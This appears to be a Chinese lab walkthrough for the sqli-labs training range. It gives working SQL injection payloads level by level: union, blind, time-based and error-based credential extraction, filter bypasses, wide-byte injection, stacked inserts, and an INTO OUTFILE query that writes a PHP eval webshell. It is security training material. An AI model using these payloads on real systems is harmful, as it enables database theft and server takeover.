---
title: sqli-labs速刷
categories: web漏洞
---
# 前言
速刷 基本语句为 `$id` `'$id'` `"$id"` `($id)` `(($id))` `('$id')` `("$id")`

# 前置阅读
[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169#toc-22)

[SQLI labs 靶场精简学习记录](https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-100)

[MySQL常用的系统函数](https://blog.csdn.net/pan_junbiao/article/details/86511477)

[sql注入之order by注入 · Yang1k](https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/)

<!--more-->
# 1-20 -- 基础
## Less-1

语句：id='$id'

(1)	联合查询

>?id=-1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password `SEPARATOR '<br>'`) FROM users)--+

separator 分隔符
`<br>`的作用是html渲染时换行

(2)	布尔盲注
>?id=1' and ascii(substr((select group_concat(password) from users),1,1))=68--+

Substring或者mid都可以

(3)	延时注入
>?id=1' and if(ascii(substr((select group_concat(password) from users),1,1))=68,1,sleep(3))--+

(4)	报错注入
>?id='or(updatexml(1,concat(0x26,database(),0x26),1))%23
?id=1'||extractvalue(1,concat(0x7e,database()))--+

## Less-5
正常输入id没有回显账号密码，利用页面的不同进行盲注或者延时注入或报错注入

## Less-6
语句：id="$id"
双引号包括数字开头的字符串比如："1 union select 1,2,3"会取数字 1

## Less-7
提示outfile 使用into outfile 可以尝试写入webshell

语句： id=(('$id')) 

>?id=0')) union select 1,2,"<?php eval($_POST[a]);?>" into outfile "D:/phpstudy_pro/WWW/sqli-labs/Less-7/test.php" -- +


## Less-9
不管怎么构造都是相同的结果，考虑尝试单引号进行闭合，然后延时注入

>?id=1' and 1=if(2>1,sleep(3),2)%23

## Less-12
uname=0") union select 1,2%23&passwd=1234

## Less-13
uname=admin') and substr((select user()),1,1)='r'%23

## Less-17
这里是一个更新密码的输入框，看源码一堆过滤

语句:
```
UPDATE users SET password = '$passwd' WHERE username='$row1'
```
admin and updatexml(1,concat(0x7e,(select user()),0x7e),1)#

## Less-18-20
UA, Referer，cookie注入
uname=1'or(updatexml(1,concat(0x26,database(),0x26),1))#

# 21-37 -- bypass

## Less-21
正常登录cookie是base64加密

## Less-23
`过滤了注释符，闭合后面的单引号`
?id=0' union select 1,2,(select database())'

## Less-24
三个界面，注册 登录，更改密码的界面，很容易想到二次注入

看后面的代码：
在注册登录时都对输入的参数进行了过滤，在更改密码的时候没有进行过滤直接拼接到语句中

```php
$username= $_SESSION["username"];
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```
注册一个`admin'#`

拼接进去后变成这样的语句：
```
UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'
```
这样就更改了admin的密码，将username加一个mysql_real_escape_string即可过滤

## Less-25
过滤了or 和and
`符号 || 和 && 进行绕过`

## Less-26
`过滤 or and /* -- # 空格 \ `

`过滤了 or 和 and 可以采用 双写或者 && || 绕过`

`过滤注释 可以使用闭合绕过`

`过滤了空格 可以使用如下的符号来替代`：
```
%09	TAB 键(水平)
%0a	新建一行
%0c	新的一页
%0d	return 功能
%0b	TAB 键(垂直)
%a0	空格
() 括号
```
## Less-27
union select 大小写，`双写绕过 `

## Less-29
Index.php没啥说的
login.php
```php
<?php
// take the variables 
if(isset($_GET['id']))
{
	$qs = $_SERVER['QUERY_STRING'];
	$hint=$qs;
	$id1=java_implimentation($qs);
	$id=$_GET['id'];
	//echo $id1;
	whitelist($id1);

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	输出
  	
//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
function whitelist($input)
{
	$match = preg_match("/^\d+$/", $input);
	if($match)
	{
		//echo "you are good";
		//return $match;
	}
	else
	{	
		header('Location: hacked.php');
		//echo "you are bad";
	}
}



// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
function java_implimentation($query_string)
{
	$q_s = $query_string;
	$qs_array= explode("&",$q_s); //以&为分割符 分割字符串
	foreach($qs_array as $key => $value)
	{
		$val=substr($value,0,2);
		if($val=="id")
		{
			$id_value=substr($value,3,30); 
			return $id_value;
			echo "<br>";
			break;
		}
```
`Apache PHP 会解析最后一个参数`

`Tomcat JSP 会解析第一个参数`

java_implimentation这个方法就相当于以 `&` 为分界符号，截取第一个id参数然后进行白名单检查

如果这样?id=1&id=2
那么apache接受到的是2 而进行检查的是1

>?id=1&id=0' union select 1,2,database()'

## Less-32
宽字节注入

在 ' 前加了 \ 

MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 `%aa%5c ` 就是一个 汉字。因为过滤方法主要就是`在敏感字符前面添加 反斜杠 \`，所以这里想办法干掉反斜杠即可。

一、
`%df 吃掉 \`

>具体的原因是 urlencode(\') = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。

二、
`将 \' 中的 \ 过滤掉`
例如可以构造 %5c%5c%27 的情况，后面的%5c会被前面的%5c 给注释掉。这也是 bypass 的一种方法。

>?id=%df' union select 1,2,3%23

## Less-33
使用addslashes() 函数返回在预定义字符之前添加反斜杠的字符串
同32

## Less-34
这关在33的基础上将get请求变为了post请求
`将 utf-8 转换为 utf-16 或 utf-32，例如将 ' 转为 utf-16 为�'`

我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：
```
➜  ~ echo \'|iconv -f utf-8 -t utf-16
��'
➜  ~ echo \'|iconv -f utf-8 -t utf-32
��'
```
## Less-36
还是mysql_real_escape_string()
>?id=-1%df' union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+

>?id=-1�' union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+

# 38-53 -- 堆叠注入
## Less-38
原理:数据库的多条语句执行
`mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句`。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。

>?id=1';INSERT INTO users VALUES('99','cys','cys');-- +

## Less-46
[sql注入之order by注入 · Yang1k](https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/)

语句：SELECT * FROM users ORDER BY $id

`order by 1或2或3 是按列进行排序`

**报错**：
>?sort=updatexml(1,if(length(database())=8,1,user()),1)

注入正确则返回xpath报错内容

**盲注**：
一、盲注
>?sort=if(length(database())=8,1,(select id from information_schema.tables))

二、rand()+布尔
>?sort=rand(length(database())>1)  

`rand(true)与rand(false)返回页面不同`
三、rand()+延时
>?sort=if(1=1,1,sleep(1))

测试的时候发现延迟的时间`并不是sleep(1)中的1秒，而是大于1秒`。 最后发现延迟的时间和所查询的数据的条数是成倍数关系的。 计算公式：
```
延迟时间=sleep(1)的秒数*所查询数据条数，所以可以sleep(0.1)
```
**另一种union盲注**：
语句：
>SELECT * FROM users where username = 'admin' union select 1,2,'a' order by 3 -- +'

通过更改 `’a’` 来进行注入
```
id username password
1	2	a
8	admin	admin
```
**into outfile**：
注入天书里面提供了 `lines terminated by` 姿势用于 order by 的情况来 getsgell： 

>?sort=1 into outfile "/var/www/html/less46.php" lines terminated by 0x3c3f70687...

`LINES TERMINATED BY：设置行与行之间的分隔符`
# 54-65 --挑战

## Less-58
```
?id= 0'or updatexml(1,concat(0x26,(select group_concat(secret_BYWL SEPARATOR '<br>') from mhz4mmxrjk),0x26),1)%23
```
完结

